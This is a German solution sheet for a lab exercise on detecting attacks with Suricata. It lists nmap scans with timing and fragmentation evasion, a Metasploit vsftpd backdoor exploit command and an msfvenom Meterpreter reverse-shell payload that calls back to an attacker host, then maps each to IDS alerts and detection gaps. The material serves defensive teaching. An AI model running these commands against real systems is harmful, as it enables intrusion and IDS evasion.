# Lösung – Übung 08: Angriffserkennung

## 1. Portscan + Timing-Evasion

```bash
sudo nmap -sS -T4 -p- <ZIEL>      # laut -> viele "ET SCAN"-Alerts
sudo nmap -sS -T0 -p 22,80,445 <ZIEL>   # sehr langsam -> kaum/keine Scan-Alerts
```
→ `-T0` unterläuft schwellenbasierte Scan-Erkennung (zu langsam für die Thresholds). Belegt: Timing-Evasion wirkt gegen rate-basierte Signaturen.

## 2. Bekannter Exploit

```bash
# Metasploit (aus exploitation-metasploit):
use exploit/unix/ftp/vsftpd_234_backdoor ; set RHOSTS <ZIEL> ; exploit
```
In Suricata: Exploit-/Backdoor-Signaturen (`ET EXPLOIT`/`ET MALWARE`) feuern. Samba usermap analog.

## 3. C2/Reverse-Shell

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o s.elf
# Handler + Ausführung -> Callback
```
Erkennung: unverschlüsselte Payloads/Stager → Signatur; Meterpreter/C2-Beaconing → „ET MALWARE"/Policy-Alerts bei regelmäßigen Outbound-Verbindungen. Sliver-HTTPS dagegen oft nur über Anomalie/JA3 sichtbar.

## 4. Verschlüsselt/fragmentiert

```bash
sudo nmap -sS -f <ZIEL>           # Fragmentation
# C2 über HTTPS/TLS statt Klartext
```
→ Fragmentation reassembliert Suricata meist (erkannt), aber **TLS-verschlüsselter** C2-Inhalt ist **unsichtbar** → nur Metadaten (JA3, SNI, Zielhäufigkeit). Detection-Gap wird sichtbar.

## 5. Kill-Chain-Mapping + Gaps

| Phase (ATT&CK) | erkannt? |
|----------------|----------|
| Recon/Scan (`-T4`) | ✅ ET SCAN |
| Scan (`-T0`) | ❌ (Timing-Evasion) |
| Exploitation (Klartext) | ✅ Exploit-Signatur |
| C2 (Klartext) | ✅ Beaconing/Malware |
| C2 (TLS) | ⚠️ nur Metadaten (Gap) |

**Gaps:** langsame Scans, TLS-C2, 0-Days → brauchen Anomaly-Detection, **Zeek** (Übung 09), HIDS/EDR, TLS-Inspection.

## Härtung/Detection-Ausbau

Rate-basierte + anomaliebasierte Erkennung kombinieren, Zeek für Metadaten/Beaconing-Analyse, EDR auf Hosts, TLS-Inspection wo möglich, Threat-Intel-Feeds.

## Häufige Fehler / Troubleshooting

- **Nichts erkannt:** Suricata sieht den Pfad nicht (Interface/NAT) oder relevante Kategorie deaktiviert.
- **`-T0` dauert ewig:** erwartbar – das ist der Preis der Evasion (für den Angreifer).
- **TLS „blind":** korrekt – Grenze signaturbasierter NIDS; Zeek/Metadaten nutzen.
- **Ziel durch Exploit kaputt:** Snapshot zurück.
